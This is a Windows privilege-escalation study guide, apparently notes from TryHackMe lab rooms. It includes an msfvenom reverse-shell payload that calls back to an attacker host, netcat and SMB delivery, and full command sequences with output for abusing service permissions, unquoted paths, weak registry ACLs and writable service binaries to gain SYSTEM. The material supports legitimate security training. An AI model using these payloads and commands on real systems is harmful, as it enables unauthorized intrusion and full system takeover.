# Windows Privesc

## General concepts

### Users and groups

User accounts can belong to multiple groups, and groups can have multiple users.

> There are also pseudo groups such as "**Authenticated Users**"

> The "**SYSTEM**" account is a default service account which has the highest privileges of any local account in Windows.

> The "**Administrator**" account is created by default at install. Depending on the version of Windows, other accounts such as "**Guest**" can be created by default as well.

> Adding a user to the Administrator group: `net localgroup administrators <username> /add`


### Resources and access control

In Windows, there are multiple types of resource (also known as **objects**):

- Files / Directories
- Registry Entries
- Services

Whether a user and/or group has permission to perform a certain action on a resource depends on that resource's **Access Control List** (ACL).

Each ACL is made up of zero or more **access control entries** (ACEs).

Each ACE defines the **relationship between a principal** (e.g. a user, group) **and a certain access right** (Full control, read & execute, write, etc.).


### Uploading a reverse shell on Windows target machine

#### From Kali

```bash
# Generate a reverse shell executable
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe -o reverse-shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse-shell.exe
# Run a SMB server
> python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
# On another terminal, start a listener
> nc -lnvp 1234
```

#### From Windows target

```cmd
C:\Users\user> copy \\10.11.35.147\kali\reverse-shell.exe C:\PrivEsc\reverse-shell.exe
        1 file(s) copied.
```

___

## Tools

These tools provide information that can help for further investigation and privilege escalation:

- [`winPEAS`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
    + To enable colors add the following registry key:

    ```cmd
    > reg add HKCU\Console /v VirtualTerminalLevel/t REG_DWORD /d 1
    ```

    + Then open a new command prompt:

    ```cmd
    > .\winPEASany.exe -h
    > .\winPEASany.exe quiet cmd fast
    > .\winPEASany.exe quiet cmd systeminfo
    ```

- [`Seatbelt`](https://github.com/GhostPack/Seatbelt) | [exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)

    ```cmd
    > .\Seatbelt.exe all
    ```

Looking for specific misconfigurations:

- [`PowerUp`](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1) (based on **Powershell**)

    ```powershell
    PS>. .\PowerUp.ps1    
    PS> Invoke-AllChecks
    ```

    > `AbuseFunction`(s) will be printed.

- [`SharpUp`](https://github.com/GhostPack/SharpUp) (Compiled **C#** version of `PowerUp`) | [exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)

    ```cmd
    > .\SharpUp.exe
    ```

Checking user access control rights:

- `accesschk.exe`
    + Downside: the nore recent versions spawn a GUI "accept EULA" popup window (non visible when we only have a shell).

- <https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>

___

## Kernel exploits

Kernel (core of an operating system) => layer between software and actual hardware.

Steps:

1. Enumerate Windows version / patch level (via `systeminfo` for instance)
2. Find matching exploits (exploitDB, github, google, etc.)
3. Compile & run

### Tools

There are a few tools available to help find kernel exploits:

- [wesng](https://github.com/bitsadmin/wesng)
- [Sherlock](https://github.com/rasta-mouse/Sherlock)
- [Watson](https://github.com/rasta-mouse/Watson#watson)
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Some precompiled kernel exploits: <https://github.com/SecWiki/windows-kernel-exploits>

___

## Service Exploits

Services are simply programs that run in the background, accepting input or performing regular tasks.

Some common commands:

- starting/stopping a service:

    ```cmd
    > net start/stop <name>
    ```

- querying the configuration of a service:

    ```cmd
    > sc.exe qc <name>
    ```

- querying the current status of a service:

    ```cmd
    > sc.exe query <name>
    ```

- modifying a configuration option of a service:

    ```cmd
    > sc.exe config <name> <option>= <value>
    ```

### 1. Insecure service permissions

As mentioned previously, each service has an ACL that defines permissions.

- innocuous permissions: `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS` and so on.

- useful permissions: `SERVICE_STOP`, `SERVICE_START`.

- dangerous permissions: `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`

> **Potential Rabbit Hole:** being able to change a service configuration without the ability to start/stop the service cannot lead to privesc!

#### Example: `daclservice.exe`

By running `.\winPEAS.exe quiet serviceinfo`, we can see that we can modify the service `daclservice.exe`:

![](img/daclservice.png)

![](img/modifiable-services.png)

We can verify this with **accesschk.exe**:

```cmd
C:\PrivEsc>.\accesschk.exe /accepteula -uwcqv user daclsvc 
.\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

We can change config, start and stop the service.

Let's get the config and the current status of the service:

```
C:\PrivEsc>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>sc query daclsvc
sc query daclsvc

SERVICE_NAME: daclsvc 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

The service is currently stopped, it has to be started manually (`DEMAND_START`) and it should run with the permissions of the system user (`LocalSystem`).

In order to privesc, we can change the `BINARY_PATH_NAME` to our reverse shell payload and then start the service:

```cmd
C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
[SC] ChangeServiceConfig SUCCESS
C:\PrivEsc>net start daclsvc
net start daclsvc
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

Start a(nother) listener on your Kali machine and BOUM we're SYSTEM:

```console
root@kali:~/thm/windows10privesc# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.11.35.147] from (UNKNOWN) [10.10.61.59] 49940
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### 2. Unquoted Service Path 

As you may noticed, executables can be run without their extensions _(e.g. "sc.exe" can be run by just typing "sc")._

Paths with spaces can be interpreted as executables with arguments separated by spaces as well as path of a single file with directories that contain spaces in their names.

Example: `C:\Program Files\Some Directory\Program.exe`

This is called **unquoted path**.

Windows resolves this ambiguity by checking each of the possibilities in turn.

If we can write to a location windows checks before the actual executable, we can trick the service into executing our program instead.

#### Practical example

![](img/unquotedpathservice.png)

Regarding the service above, Windows will look for `C:\Program.exe`, `C:\Program Files\Unquoted.exe` and `C:\Program Files\Unquoted Path Service\Common.exe` because of this path `C:\Program Files\Unquoted Path Service\Common Files\`.

If we can write one of these files, we can execute a malicious program instead of `unquotedpathservice.exe`  

1. First let's verify if we have the permission to start the service:

```powershell
C:\PrivEsc>.\accesschk.exe /accepteula -ucqv user unquotedsvc 
.\accesschk.exe /accepteula -ucqv user unquotedsvc
R  unquotedsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

2. Then, let's check for write permissions on each directory of the given path `C:\Program Files\Unquoted Path Service\Common Files\`:

```cmd
C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:"
.\accesschk.exe /accepteula -uwdq "C:"
C:\PrivEsc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  RW BUILTIN\Users


C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
C:\Program Files
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators


C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"            
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"                                                                                                                 
C:\Program Files\Unquoted Path Service                                                                                                                                                      
  Medium Mandatory Level (Default) [No-Write-Up]                                                                                                                                            
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

3. We can write a malicious program called "Common.exe" in `"C:\Program Files\Unquoted Path Service\"` and then start the service:

```cmd
C:\PrivEsc>copy reverse-shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
copy reverse-shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.

C:\PrivEsc>net start unquotedsvc
```

### 3. Weak Registry Permissions

In case, modifying the service config is not possible, then we have to check if we can modify any service registry:

![](img/weak-registry-perms.png)

Looks like we can! 

Now we can confirm that this service has a weak registry entry using either **Powershell** or **accesschk.exe**:

```powershell
C:\PrivEsc>powershell -exec bypass
powershell -exec bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\PrivEsc> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
```

```cmd
C:\PrivEsc>.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc                                     
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

C:\PrivEsc>sc qc regsvc     
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

> **Note**: the `AUTHORITY\INTERACTIVE` group has full control over the registry entry. This is a pseudo group comprised of all users who can log onto the system locally, which includes our user.

We can see that we have the correct permissions and that the service is executed as **SYSTEM**.

Now let's query th service registry entry and check the current values:

```cmd
C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc
reg query HKLM\System\CurrentControlSet\Services\regsvc

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security
```

We can overwrite the ImagePath registry value to point to a malicious program:

```cmd
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse-shell.exe /f
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse-shell.exe /f
The operation completed successfully.

C:\PrivEsc>net start regsvc
net start regsvc
```

### 4. Insecure Service Executables

Obviously, if the service executable itself is modifiable by us, we can replace its content by a malicious program. 

![](img/filepermsvc.png)

Using **accesschk.exe**, we can notice that the service binary (`BINARY_PATH_NAME`) file is writable by everyone (RW Everyone - FILE_ALL_ACCESS):

```cmd
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

Let's check that we can start/stop the service:

```cmd
C:\Users\user>C:\PrivEsc\accesschk.exe /accepteula -uvqc user filepermsvc

R  filepermsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

Now we can replace the service binary by our reverse shell executable but first let's create a backup of it:

```cmd
C:\Users\user>copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
        1 file(s) copied.

C:\Users\user>copy C:\PrivEsc\reverse-shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.

C:\Users\user>net start filepermsvc
net start filepermsvc
```

### 5. DLL Hijacking

- Does the DLL path writable by our user?

___

## Registry

### Autoruns

### AlwaysInstallElevated 

___

## Resources

- [THM - Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
- [THM - Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)
- [THM - Post-Exploitation Basics](https://tryhackme.com/room/postexploit)
- [THM - Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)
- [THM - ICE](https://tryhackme.com/room/ice)